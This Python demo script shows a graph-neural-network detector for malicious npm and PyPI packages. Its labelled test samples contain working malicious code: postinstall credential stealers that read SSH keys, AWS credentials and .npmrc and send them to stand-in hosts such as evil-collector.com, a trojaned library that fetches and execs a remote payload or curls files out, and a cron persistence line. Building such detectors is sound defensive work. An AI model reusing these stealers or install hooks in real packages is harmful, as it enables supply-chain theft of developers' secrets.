"""
Comprehensive demo of CPG-GNN malicious package detection system.
Demonstrates the complete pipeline from code to graph to prediction.
"""

import asyncio
import logging
import time
from typing import Dict, List

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Import CPG components
from cpg.config import create_default_config
from cpg.graph_builder import CPGBuilder
from cpg.model import create_cpg_model
from cpg.trainer import PackageSample

# Import benchmark integration
from cpg_benchmark_integration import CPGBenchmarkModel
from icn.evaluation.benchmark_framework import BenchmarkSample


def create_demo_samples() -> List[PackageSample]:
    """Create realistic demo samples for CPG-GNN testing."""
    
    samples = []
    
    # 1. Benign utility package (npm)
    samples.append(PackageSample(
        package_name="simple-utils",
        ecosystem="npm",
        label=0,
        file_contents={
            "package.json": '''
{
    "name": "simple-utils",
    "version": "1.0.0",
    "description": "Simple utility functions",
    "main": "index.js",
    "dependencies": {}
}
''',
            "index.js": '''
// Simple utility functions
function addNumbers(a, b) {
    return a + b;
}

function formatString(str) {
    return str.trim().toLowerCase();
}

function isValidEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
}

function generateRandomId() {
    return Math.random().toString(36).substring(2, 15);
}

module.exports = {
    addNumbers,
    formatString,
    isValidEmail,
    generateRandomId
};
''',
            "test.js": '''
const utils = require('./index');

console.log('Testing utility functions...');
console.log('Add numbers:', utils.addNumbers(2, 3));
console.log('Format string:', utils.formatString('  HELLO WORLD  '));
console.log('Valid email:', utils.isValidEmail('test@example.com'));
console.log('Random ID:', utils.generateRandomId());
'''
        },
        sample_type="benign"
    ))
    
    # 2. Malicious credential stealer (npm)
    samples.append(PackageSample(
        package_name="malicious-stealer",
        ecosystem="npm",
        label=1,
        file_contents={
            "package.json": '''
{
    "name": "helpful-logger",
    "version": "2.1.0",
    "description": "Enhanced logging utilities",
    "main": "logger.js",
    "scripts": {
        "postinstall": "node setup.js"
    }
}
''',
            "logger.js": '''
// Legitimate-looking logger functionality
const fs = require('fs');

class Logger {
    constructor(options = {}) {
        this.level = options.level || 'info';
        this.filename = options.filename;
    }
    
    log(message, level = 'info') {
        const timestamp = new Date().toISOString();
        const logEntry = `[${timestamp}] ${level.toUpperCase()}: ${message}\\n`;
        
        if (this.filename) {
            fs.appendFileSync(this.filename, logEntry);
        } else {
            console.log(logEntry.trim());
        }
    }
    
    info(message) { this.log(message, 'info'); }
    warn(message) { this.log(message, 'warn'); }
    error(message) { this.log(message, 'error'); }
}

// Hidden malicious functionality
const stealData = () => {
    try {
        const os = require('os');
        const path = require('path');
        const https = require('https');
        
        const homeDir = os.homedir();
        const targets = [
            '.ssh/id_rsa',
            '.aws/credentials', 
            '.env',
            '.npmrc'
        ];
        
        let stolen = {};
        
        targets.forEach(target => {
            try {
                const filepath = path.join(homeDir, target);
                if (fs.existsSync(filepath)) {
                    stolen[target] = fs.readFileSync(filepath, 'utf8');
                }
            } catch (e) {}
        });
        
        // Exfiltrate data
        if (Object.keys(stolen).length > 0) {
            const payload = Buffer.from(JSON.stringify(stolen)).toString('base64');
            
            const options = {
                hostname: 'evil-collector.com',
                port: 443,
                path: '/api/collect',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'npm/6.14.0'
                }
            };
            
            const req = https.request(options, (res) => {});
            req.write(JSON.stringify({ data: payload }));
            req.end();
        }
    } catch (error) {
        // Silent failure
    }
};

// Execute stealer after delay
setTimeout(stealData, 5000);

module.exports = Logger;
''',
            "setup.js": '''
// Post-install script that looks benign but contains malicious code
const fs = require('fs');
const path = require('path');
const os = require('os');

console.log('Setting up enhanced logging...');

// Create log directory
const logDir = path.join(os.tmpdir(), 'app-logs');
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });
}

// Hidden persistence mechanism
const cronTab = `
# Enhanced logging cron job
*/5 * * * * /usr/bin/node ${__filename} >/dev/null 2>&1
`;

try {
    const cronPath = path.join(os.homedir(), '.cron_jobs');
    fs.appendFileSync(cronPath, cronTab);
} catch (e) {}

// Environment variable harvesting
process.env.MALICIOUS_INSTALLED = 'true';

console.log('Setup complete!');
'''
        },
        sample_type="malicious_intent"
    ))
    
    # 3. Trojan package (compromised legitimate package)
    samples.append(PackageSample(
        package_name="compromised-lib",
        ecosystem="pypi",
        label=1,
        file_contents={
            "setup.py": '''
from setuptools import setup, find_packages

setup(
    name="data-processor",
    version="1.4.2",
    description="Fast data processing utilities",
    author="DataTeam",
    author_email="team@dataprocessor.com",
    packages=find_packages(),
    install_requires=[
        "pandas>=1.0.0",
        "numpy>=1.18.0",
    ],
)
''',
            "data_processor/__init__.py": '''
"""
Data Processing Library - Fast and efficient data manipulation tools.
"""

from .core import DataProcessor, BatchProcessor
from .utils import clean_data, validate_schema
from .formats import CSVReader, JSONWriter

__version__ = "1.4.2"
__all__ = ["DataProcessor", "BatchProcessor", "clean_data", "validate_schema", "CSVReader", "JSONWriter"]

# Hidden trojan activation
import os
import sys
import threading
import time

def _background_task():
    """Background task that appears to be for telemetry but is malicious."""
    time.sleep(30)  # Wait before activation
    
    try:
        import subprocess
        import base64
        import urllib.request
        
        # Download and execute payload
        payload_url = "https://cdn.jsdelivr.net/gh/malicious-user/payloads@main/collector.py"
        
        try:
            response = urllib.request.urlopen(payload_url, timeout=10)
            payload = response.read()
            
            # Decode and execute
            decoded_payload = base64.b64decode(payload)
            exec(decoded_payload, {"__name__": "__main__"})
            
        except Exception:
            # Fallback: direct system access
            home_dir = os.path.expanduser("~")
            sensitive_files = [
                ".ssh/id_rsa",
                ".aws/credentials",
                ".config/gcloud/application_default_credentials.json"
            ]
            
            for file_path in sensitive_files:
                full_path = os.path.join(home_dir, file_path)
                if os.path.exists(full_path):
                    # Exfiltrate file contents
                    subprocess.run([
                        "curl", "-X", "POST",
                        "-d", f"@{full_path}",
                        "https://evil-server.org/collect"
                    ], capture_output=True)
                    
    except Exception:
        pass  # Silent failure

# Start background thread
_thread = threading.Thread(target=_background_task, daemon=True)
_thread.start()
''',
            "data_processor/core.py": '''
import pandas as pd
import numpy as np
from typing import Dict, List, Any, Optional

class DataProcessor:
    """Main data processing class with pandas integration."""
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.data = None
        
    def load_csv(self, filepath: str, **kwargs) -> pd.DataFrame:
        """Load CSV file into processor."""
        self.data = pd.read_csv(filepath, **kwargs)
        return self.data
    
    def clean_data(self) -> pd.DataFrame:
        """Clean loaded data."""
        if self.data is None:
            raise ValueError("No data loaded")
        
        # Remove null values
        self.data = self.data.dropna()
        
        # Remove duplicates
        self.data = self.data.drop_duplicates()
        
        return self.data
    
    def transform(self, transformations: List[Dict]) -> pd.DataFrame:
        """Apply transformations to data."""
        for transform in transformations:
            operation = transform.get('operation')
            column = transform.get('column')
            
            if operation == 'normalize' and column:
                self.data[column] = (self.data[column] - self.data[column].mean()) / self.data[column].std()
            elif operation == 'log_transform' and column:
                self.data[column] = np.log1p(self.data[column])
        
        return self.data

class BatchProcessor(DataProcessor):
    """Batch processing with parallel execution."""
    
    def __init__(self, batch_size: int = 1000, n_workers: int = 4):
        super().__init__()
        self.batch_size = batch_size
        self.n_workers = n_workers
    
    def process_batches(self, processing_func, data: pd.DataFrame = None) -> pd.DataFrame:
        """Process data in batches."""
        if data is None:
            data = self.data
        
        if data is None:
            raise ValueError("No data provided")
        
        results = []
        for i in range(0, len(data), self.batch_size):
            batch = data.iloc[i:i + self.batch_size]
            result = processing_func(batch)
            results.append(result)
        
        return pd.concat(results, ignore_index=True)
''',
            "data_processor/utils.py": '''
import pandas as pd
import numpy as np
from typing import Dict, Any, List

def clean_data(data: pd.DataFrame, strategy: str = 'drop') -> pd.DataFrame:
    """Clean data using specified strategy."""
    if strategy == 'drop':
        return data.dropna()
    elif strategy == 'fill_mean':
        return data.fillna(data.mean())
    elif strategy == 'fill_median':
        return data.fillna(data.median())
    else:
        return data

def validate_schema(data: pd.DataFrame, schema: Dict[str, Any]) -> bool:
    """Validate data against expected schema."""
    for column, expected_type in schema.items():
        if column not in data.columns:
            return False
        if not data[column].dtype.name.startswith(expected_type):
            return False
    return True

def detect_outliers(data: pd.Series, method: str = 'iqr') -> List[int]:
    """Detect outliers using specified method."""
    if method == 'iqr':
        Q1 = data.quantile(0.25)
        Q3 = data.quantile(0.75)
        IQR = Q3 - Q1
        lower_bound = Q1 - 1.5 * IQR
        upper_bound = Q3 + 1.5 * IQR
        return data[(data < lower_bound) | (data > upper_bound)].index.tolist()
    elif method == 'zscore':
        z_scores = np.abs((data - data.mean()) / data.std())
        return data[z_scores > 3].index.tolist()
    else:
        return []
'''
        },
        sample_type="compromised_lib",
        metadata={"injected_units": ["_background_task", "_thread", "payload_url"]}
    ))
    
    return samples


def demonstrate_cpg_building():
    """Demonstrate Code Property Graph construction."""
    
    print("\n" + "="*60)
    print("🏗️  CPG CONSTRUCTION DEMONSTRATION")
    print("="*60)
    
    # Create configuration and builder
    cpg_config, _, _ = create_default_config()
    cpg_builder = CPGBuilder(cpg_config)
    
    # Create a simple test package
    test_files = {
        "main.py": '''
import os
import subprocess

def read_file(filename):
    with open(filename, 'r') as f:
        return f.read()

def process_data(data):
    # Process the data
    result = data.upper()
    return result

def send_data(data):
    # This looks suspicious - sending data somewhere
    subprocess.run(['curl', '-X', 'POST', 'https://evil.com', '-d', data])

if __name__ == "__main__":
    config = read_file('.env')
    processed = process_data(config)
    send_data(processed)
''',
        "utils.py": '''
def helper_function():
    return "helper"

def another_function():
    x = helper_function()
    return x + "_modified"
'''
    }
    
    # Build CPG
    print("Building Code Property Graph...")
    cpg = cpg_builder.build_package_graph("demo-package", "pypi", test_files)
    
    print(f"✅ CPG constructed successfully!")
    print(f"   📊 Graph Statistics:")
    print(f"      - Nodes: {cpg.total_nodes}")
    print(f"      - Edges: {cpg.total_edges}")
    print(f"      - Files: {cpg.num_files}")
    
    print(f"   🔗 Edge Types:")
    for edge_type, count in cpg.edge_types.items():
        print(f"      - {edge_type}: {count}")
    
    print(f"   🚨 API Calls Detected:")
    for api in cpg.api_calls:
        print(f"      - {api}")
    
    return cpg


def demonstrate_feature_extraction():
    """Demonstrate feature extraction from CPG."""
    
    print("\n" + "="*60)
    print("🧬 FEATURE EXTRACTION DEMONSTRATION")
    print("="*60)
    
    # Build a CPG first
    cpg_config, _, _ = create_default_config()
    cpg_builder = CPGBuilder(cpg_config)
    model = create_cpg_model(cpg_config)
    
    test_files = {
        "malicious.js": '''
const fs = require('fs');
const https = require('https');

function stealSecrets() {
    const secrets = fs.readFileSync('/etc/passwd', 'utf8');
    const encoded = Buffer.from(secrets).toString('base64');
    
    https.request('https://attacker.com/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'}
    }, (res) => {}).end(JSON.stringify({data: encoded}));
}

stealSecrets();
'''
    }
    
    cpg = cpg_builder.build_package_graph("malicious-package", "npm", test_files)
    
    # Extract features
    print("Extracting features from CPG...")
    data = model.feature_extractor.extract_features(cpg)
    
    print(f"✅ Features extracted successfully!")
    print(f"   📊 Feature Tensor Shape: {data.x.shape}")
    print(f"   🔗 Edge Index Shape: {data.edge_index.shape}")
    print(f"   🌐 Global Features Shape: {data.global_features.shape}")
    
    print(f"   📋 Data Object Contents:")
    print(f"      - Nodes: {data.num_nodes}")
    print(f"      - Edges: {data.edge_index.size(1)}")
    print(f"      - Package: {data.package_name}")
    print(f"      - Ecosystem: {data.ecosystem}")
    
    return data


def demonstrate_model_prediction():
    """Demonstrate CPG-GNN model prediction."""
    
    print("\n" + "="*60)
    print("🤖 MODEL PREDICTION DEMONSTRATION")
    print("="*60)
    
    # Create model and samples
    cpg_config, _, _ = create_default_config()
    model = create_cpg_model(cpg_config)
    samples = create_demo_samples()
    
    print("Making predictions on demo samples...")
    
    for i, sample in enumerate(samples):
        print(f"\n--- Sample {i+1}: {sample.package_name} ({sample.sample_type}) ---")
        
        # Build CPG
        cpg_builder = CPGBuilder(cpg_config)
        cpg = cpg_builder.build_package_graph(
            sample.package_name,
            sample.ecosystem,
            sample.file_contents
        )
        
        # Make prediction
        start_time = time.time()
        output = model.predict_package(cpg)
        inference_time = time.time() - start_time
        
        # Display results
        prediction_label = "MALICIOUS" if output.prediction == 1 else "BENIGN"
        ground_truth_label = "MALICIOUS" if sample.label == 1 else "BENIGN"
        
        print(f"   Ground Truth: {ground_truth_label}")
        print(f"   Prediction: {prediction_label}")
        print(f"   Confidence: {output.confidence:.3f}")
        print(f"   Inference Time: {inference_time:.3f}s")
        print(f"   Graph Size: {output.num_nodes} nodes, {output.num_edges} edges")
        
        # Show attention analysis if available
        if output.top_suspicious_subgraphs:
            print(f"   🎯 Top Suspicious Subgraphs:")
            for j, subgraph in enumerate(output.top_suspicious_subgraphs[:3]):
                attention = subgraph.get('attention_weight', 0.0)
                print(f"      {j+1}. Attention: {attention:.3f}")


async def demonstrate_benchmark_integration():
    """Demonstrate benchmark framework integration."""
    
    print("\n" + "="*60)
    print("🏆 BENCHMARK INTEGRATION DEMONSTRATION")
    print("="*60)
    
    # Create benchmark model
    cpg_benchmark_model = CPGBenchmarkModel()
    
    # Create benchmark sample
    benchmark_sample = BenchmarkSample(
        package_name="test-credential-stealer",
        ecosystem="npm",
        sample_type="malicious_intent", 
        ground_truth_label=1,
        raw_content="""
# File: package.json
{"name": "credential-stealer", "version": "1.0.0"}
==================================================
# File: stealer.js
const fs = require('fs');
const os = require('os');
const https = require('https');

// Credential stealing function
function harvestCredentials() {
    const homeDir = os.homedir();
    const credentialPaths = [
        '.ssh/id_rsa',
        '.aws/credentials', 
        '.docker/config.json',
        '.npmrc'
    ];
    
    let harvested = {};
    
    credentialPaths.forEach(path => {
        try {
            const fullPath = homeDir + '/' + path;
            const content = fs.readFileSync(fullPath, 'utf8');
            harvested[path] = content;
        } catch (e) {
            // Ignore errors
        }
    });
    
    // Exfiltrate data
    if (Object.keys(harvested).length > 0) {
        const payload = Buffer.from(JSON.stringify(harvested)).toString('base64');
        
        const postData = JSON.stringify({
            victim: os.hostname(),
            data: payload,
            timestamp: Date.now()
        });
        
        const options = {
            hostname: 'collector.evil-domain.com',
            port: 443,
            path: '/api/v1/harvest',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (compatible; NodeCollector/1.0)'
            }
        };
        
        const req = https.request(options, (res) => {
            console.log('Data exfiltrated successfully');
        });
        
        req.on('error', (e) => {
            // Silent failure
        });
        
        req.write(postData);
        req.end();
    }
}

// Execute immediately
harvestCredentials();

// Also set up periodic execution
setInterval(harvestCredentials, 24 * 60 * 60 * 1000); // Daily

module.exports = {};
==================================================
        """.strip(),
        file_paths=["package.json", "stealer.js"],
        individual_files={
            "package.json": '{"name": "credential-stealer", "version": "1.0.0"}',
            "stealer.js": """const fs = require('fs');
const os = require('os');
const https = require('https');

function harvestCredentials() {
    const homeDir = os.homedir();
    const credentialPaths = ['.ssh/id_rsa', '.aws/credentials', '.docker/config.json', '.npmrc'];
    
    let harvested = {};
    credentialPaths.forEach(path => {
        try {
            const content = fs.readFileSync(homeDir + '/' + path, 'utf8');
            harvested[path] = content;
        } catch (e) {}
    });
    
    if (Object.keys(harvested).length > 0) {
        const payload = Buffer.from(JSON.stringify(harvested)).toString('base64');
        https.request('https://collector.evil-domain.com/api/v1/harvest', {method: 'POST'}).end(JSON.stringify({data: payload}));
    }
}

harvestCredentials();
setInterval(harvestCredentials, 24 * 60 * 60 * 1000);
module.exports = {};"""
        },
        num_files=2
    )
    
    print("Testing CPG-GNN through benchmark framework...")
    
    # Make prediction
    result = await cpg_benchmark_model.predict(benchmark_sample)
    
    print(f"✅ Benchmark prediction completed!")
    print(f"   🎯 Results:")
    print(f"      - Model: {result.model_name}")
    print(f"      - Ground Truth: {'MALICIOUS' if result.ground_truth else 'BENIGN'}")
    print(f"      - Prediction: {'MALICIOUS' if result.prediction else 'BENIGN'}")
    print(f"      - Confidence: {result.confidence:.3f}")
    print(f"      - Inference Time: {result.inference_time_seconds:.3f}s")
    print(f"      - Success: {result.success}")
    
    print(f"   📝 Explanation:")
    print(f"      {result.explanation}")
    
    print(f"   🚨 Malicious Indicators:")
    for indicator in result.malicious_indicators[:5]:
        print(f"      - {indicator}")
    
    print(f"   📊 Metadata:")
    for key, value in result.metadata.items():
        if key != 'top_suspicious_subgraphs':  # Skip complex nested data
            print(f"      - {key}: {value}")
    
    # Test detailed prediction
    print(f"\n   🔍 Getting detailed analysis...")
    detailed = cpg_benchmark_model.get_detailed_prediction(benchmark_sample)
    
    if "error" not in detailed:
        print(f"      ✅ Detailed analysis successful")
        print(f"      - Package verdict: {detailed.get('prediction', {}).get('is_malicious', 'unknown')}")
        print(f"      - Graph nodes: {detailed.get('graph_stats', {}).get('num_nodes', 0)}")
        print(f"      - Suspicious subgraphs: {len(detailed.get('suspicious_subgraphs', []))}")
    else:
        print(f"      ❌ Detailed analysis failed: {detailed['error']}")


def demonstrate_model_interpretability():
    """Demonstrate model interpretability features."""
    
    print("\n" + "="*60)
    print("🔍 MODEL INTERPRETABILITY DEMONSTRATION")
    print("="*60)
    
    # Create model and build CPG for a malicious sample
    cpg_config, _, _ = create_default_config()
    model = create_cpg_model(cpg_config)
    cpg_builder = CPGBuilder(cpg_config)
    
    # Use the credential stealer sample
    malicious_files = {
        "main.py": '''
import os
import base64
import requests
import subprocess

def collect_sensitive_data():
    """Function that collects sensitive information"""
    sensitive_files = [
        "~/.ssh/id_rsa",
        "~/.aws/credentials",
        "~/.env"
    ]
    
    collected = {}
    for file_path in sensitive_files:
        full_path = os.path.expanduser(file_path)
        try:
            with open(full_path, 'r') as f:
                collected[file_path] = f.read()
        except:
            pass
    
    return collected

def exfiltrate_data(data):
    """Function that sends data to external server"""
    if not data:
        return
    
    # Encode the stolen data
    encoded_data = base64.b64encode(str(data).encode()).decode()
    
    # Send to attacker-controlled server
    payload = {
        'victim_id': os.getenv('USER', 'unknown'),
        'data': encoded_data,
        'timestamp': os.popen('date').read().strip()
    }
    
    try:
        response = requests.post(
            'https://evil-collector.malicious-domain.com/upload',
            json=payload,
            timeout=10
        )
        print("Data uploaded successfully") if response.status_code == 200 else None
    except:
        # Fallback: try different method
        subprocess.run([
            'curl', '-X', 'POST', 
            '-H', 'Content-Type: application/json',
            '-d', str(payload),
            'https://backup-collector.evil-domain.net/receive'
        ], capture_output=True)

def main():
    # Main execution function
    print("Starting data collection...")
    sensitive_data = collect_sensitive_data()
    exfiltrate_data(sensitive_data)
    print("Collection complete.")

if __name__ == "__main__":
    main()
''',
        "utils.py": '''
import hashlib

def hash_data(data):
    return hashlib.md5(str(data).encode()).hexdigest()

def log_activity(message):
    with open('/tmp/activity.log', 'a') as f:
        f.write(f"{message}\\n")
'''
    }
    
    # Build CPG
    cpg = cpg_builder.build_package_graph("malicious-package", "pypi", malicious_files)
    
    print("Analyzing package with interpretability features...")
    
    # Get detailed explanation
    explanation = model.get_attention_explanation(cpg)
    
    print(f"✅ Interpretability analysis completed!")
    
    print(f"   🎯 Package Analysis:")
    prediction_info = explanation.get('prediction', {})
    print(f"      - Verdict: {'MALICIOUS' if prediction_info.get('is_malicious') else 'BENIGN'}")
    print(f"      - Confidence: {prediction_info.get('confidence', 0.0):.3f}")
    print(f"      - Probability: {prediction_info.get('probability', 0.0):.3f}")
    
    print(f"   📊 Graph Statistics:")
    graph_stats = explanation.get('graph_stats', {})
    for key, value in graph_stats.items():
        print(f"      - {key}: {value}")
    
    print(f"   🎯 Suspicious Subgraphs:")
    subgraphs = explanation.get('suspicious_subgraphs', [])
    if subgraphs:
        for i, subgraph in enumerate(subgraphs[:3]):
            rank = subgraph.get('rank', i+1)
            attention = subgraph.get('attention_weight', 0.0)
            print(f"      {rank}. Attention weight: {attention:.3f}")
    else:
        print(f"      - No suspicious subgraphs identified")
    
    print(f"   🚨 API Analysis:")
    api_analysis = explanation.get('api_analysis', {})
    if 'predicted_risky_apis' in api_analysis:
        print(f"      - Predicted risky APIs:")
        for api_info in api_analysis['predicted_risky_apis'][:5]:
            api_name = api_info.get('api', 'unknown')
            probability = api_info.get('probability', 0.0)
            found = api_info.get('found_in_code', False)
            status = "✓" if found else "✗"
            print(f"        {status} {api_name}: {probability:.3f}")
    
    if 'actual_apis_found' in api_analysis:
        actual_apis = api_analysis['actual_apis_found']
        if actual_apis:
            print(f"      - Actual APIs detected: {', '.join(actual_apis)}")
    
    print(f"   🧠 Attention Analysis:")
    attention_analysis = explanation.get('attention_analysis', {})
    if attention_analysis and 'error' not in attention_analysis:
        print(f"      - Attention entropy: {attention_analysis.get('attention_entropy', 0.0):.3f}")
        print(f"      - Max attention: {attention_analysis.get('max_attention', 0.0):.3f}")
        print(f"      - Attention concentration: {attention_analysis.get('attention_concentration', 0)}")


async def main():
    """Main demo function."""
    
    print("🚀 CPG-GNN COMPREHENSIVE DEMONSTRATION")
    print("=" * 60)
    print("Code Property Graph with Graph Neural Networks")
    print("for Malicious Package Detection")
    print("=" * 60)
    
    try:
        # 1. CPG Construction
        demonstrate_cpg_building()
        
        # 2. Feature Extraction  
        demonstrate_feature_extraction()
        
        # 3. Model Prediction
        demonstrate_model_prediction()
        
        # 4. Benchmark Integration
        await demonstrate_benchmark_integration()
        
        # 5. Interpretability
        demonstrate_model_interpretability()
        
        print("\n" + "="*60)
        print("✅ CPG-GNN DEMONSTRATION COMPLETED SUCCESSFULLY!")
        print("="*60)
        print("\n🎯 Key Capabilities Demonstrated:")
        print("   • Code Property Graph construction (AST + CFG + DFG)")
        print("   • Graph Neural Network inference")
        print("   • Attention-based subgraph localization")
        print("   • Benchmark framework integration")
        print("   • Interpretable predictions with explanations")
        print("   • Multi-ecosystem support (npm, PyPI)")
        print("   • Structural flow analysis")
        print("\n🔬 CPG-GNN is ready for:")
        print("   • Training on real malware datasets")
        print("   • Comparative benchmarking against ICN, AMIL, and LLMs")
        print("   • Production deployment for package analysis")
        print("   • Research in graph-based malware detection")
        
    except Exception as e:
        print(f"\n❌ Demo failed with error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())